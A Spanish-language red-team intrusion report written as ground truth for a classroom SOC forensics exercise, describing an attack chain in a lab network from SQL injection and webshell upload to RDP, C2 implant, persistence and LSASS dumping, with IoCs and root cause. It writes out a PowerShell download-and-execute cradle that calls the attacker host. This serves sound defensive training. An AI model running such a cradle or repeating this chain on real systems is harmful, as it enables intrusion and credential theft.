# HE-E12 — Informe de intrusión del equipo rojo (verdad terreno del caso)

> **Uso docente**: es el documento que el módulo **Hacking Ético** entrega al SOC como
> cierre de su ejercicio. En clase se **revela en la Sesión 3**, para que el alumnado
> **contraste** su reconstrucción forense con lo que realmente hizo el rojo (criterio de
> verificación de la rúbrica R1/R3). No lo repartas antes de la puesta en común de S2.

## Alcance autorizado (ROE)
- Objetivos: `portal-soc.xest.local` (10.10.10.10) y VLAN de laboratorio `10.10.10.0/24`.
- Estación atacante: Kali `10.10.10.66`. Ventana: 14/01/2027, 09:00–13:00.
- Fuera de alcance: cualquier host fuera de la VLAN de laboratorio.

## Resumen de la cadena
1. **Reconocimiento y SQLi** contra `portal-soc.xest.local` con sqlmap (09:12). Se extrae la
   tabla `users` y se obtiene la credencial del panel (`webadmin`).
2. **Acceso al panel** (09:38) y **subida de webshell** `shell.php` por `admin/upload.php`,
   que no valida extensión ni tipo MIME (09:41). — *T1190 / T1505.003*.
3. Vía webshell se lee `config.php` (09:55): credenciales de BD y una **contraseña de
   administrador reutilizada** en toda la red.
4. Con esa credencial, **RDP a `WIN-XEST-ADM` (10.10.10.50)** como `admin` (10:20). — *T1078 / T1021.001*.
5. **Download cradle** en PowerShell: `IEX (…).DownloadString('http://10.10.10.66:8080/a.ps1')`
   (10:24). `a.ps1` descarga el implante `svchost32.exe` a `%LOCALAPPDATA%\Temp`. — *T1059.001 / T1105*.
6. El implante inyecta shellcode y abre **C2 a 10.10.10.66:4444** (10:25). — *T1055 / T1571*.
7. **Persistencia**: clave `Run\WindowsUpdate` + tarea `\...\UpdateOrchestrator\SysHealth`
   (10:28). — *T1547.001 / T1053.005*.
8. **Reconocimiento** local (`whoami /priv`, `net user`) y **volcado de LSASS** (10:35). — *T1033 / T1003.001*.

## IoC declarados por el rojo
| Tipo | Valor |
|---|---|
| IP C2 | 10.10.10.66 |
| Puerto C2 | 4444/tcp |
| URL descarga | http://10.10.10.66:8080/a.ps1 |
| Fichero | C:\Users\admin\AppData\Local\Temp\svchost32.exe |
| Fichero | /var/www/uploads/shell.php (en el portal) |
| Persistencia | HKCU\...\Run\WindowsUpdate ; Tarea \Microsoft\Windows\UpdateOrchestrator\SysHealth |
| Cuenta abusada | admin (credencial reutilizada desde config.php del portal) |

## Causa raíz declarada
`admin/upload.php` **acepta cualquier archivo** (sin lista blanca de extensión ni verificación
de tipo). Esto permite la webshell; el resto de la cadena se apoya en **reutilización de
credenciales** y **falta de segmentación** entre el portal y la estación de administración.
Recomendación de bastionado devuelta a **PPS**.
